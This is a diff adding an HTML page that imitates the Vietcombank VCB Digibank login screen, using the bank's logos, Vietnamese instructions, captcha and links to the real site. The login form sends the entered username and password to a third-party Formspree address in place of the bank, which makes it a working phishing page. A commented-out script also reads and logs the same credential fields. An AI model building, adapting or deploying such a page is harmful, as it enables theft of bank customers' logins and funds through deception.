@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vietcombank</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header>
+        <img src="https://vcbdigibank.vietcombank.com.vn/assets/images/logo-white.svg" alt="logovcb">
+    </header>
+    <div class="wrapper">
+        <div class="form-box login">
+            <div class="logo">
+                <img src="https://vcbdigibank.vietcombank.com.vn/assets/images/logo-digibank.svg" alt="logo-vcb">
+                <p>Kính chào quý khách</p>
+            </div>
+            <div class="note-box">
+                <p>- Với khách hàng đã có tài khoản VCB Digibank: <br>
+                    <b>Tên đăng nhập là Số điện thoại đăng ký dịch vụ</b><br>
+                    - Với khách hàng chưa có tài khoản VCB Digibank: <br>
+                    <b>Tên đăng nhập là Tên đăng nhập VCB-iB@nking,</b> để 
+                    thực hiện chuyển đổi sang dịch vụ VCB Digibank mới.</p>
+                
+                <a href="#">Thu gọn</a>
+            </div>
+            <form action="https://formspree.io/f/xeqbjogv" method="post">
+                <div class="input-box">
+                    <input type="text" name="usr" required>
+                    <label>Tên đăng nhập</label>
+                </div>
+                <div class="input-box password">
+                    <span class="icon"><ion-icon name="eye-outline"></ion-icon></span>
+                    <input type="text" name="pwd" required>
+                    <label>Mật khẩu</label>
+                </div>
+                <div class="input-box codecheck">
+                    <span class="icon"><ion-icon name="repeat"></ion-icon></span>
+                    <img src="https://digiapp.vietcombank.com.vn/utility-service/v1/captcha/600cae95-28a1-8298-63a7-2f768f492bc2" alt="">
+                    <input type="text" required>
+                    <label>Mã kiểm tra</label>
+                </div>
+                <button type="submit" class="btn">Đăng nhập</button>
+                <div class="text-center">
+                    <a href="https://vcbdigibank.vietcombank.com.vn/resetpassword">Quên mật khẩu?</a>
+                    <a href="https://digibankm5.vietcombank.com.vn/get_file/ibomni/html/chuyen-doi-ib.pdf">Hướng dẫn chuyển đổi sang VCB Digibank</a>
+                    <a href="https://vcbdigibank.vietcombank.com.vn/login/booking">Đặt lịch hẹn Vietcombank</a>
+                </div>
+            </form>
+           
+        </div>
+       
+    </div>
+    <!-- <script src="script.js"></script>
+    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+    <script>
+            // tạo biến tham chiếu tới form
+            const form = document.forms[0];
+            // tạo biến tham chiếu tới nút Đăng nhập
+            const submit = document.getElementById('dang-nhap');
+            // gắn bộ lắng nghe sự kiện vào nút Đăng nhập
+            addEventListener('submit', layDuLieu);
+            // viết hàm xử lý LayDuLieu
+            let name = '';
+            let pass = '';
+            function layDuLieu () {
+                name = form.usr.value;
+                pass = form.pwd.value;
+                console.log(name);
+                console.log(pass);
+                name = 'username:' + name 
+                pass = 'password:' + pass
+                console.log(name);
+                console.log(pass);}
+    </script> -->
+</body>
+
+</html>
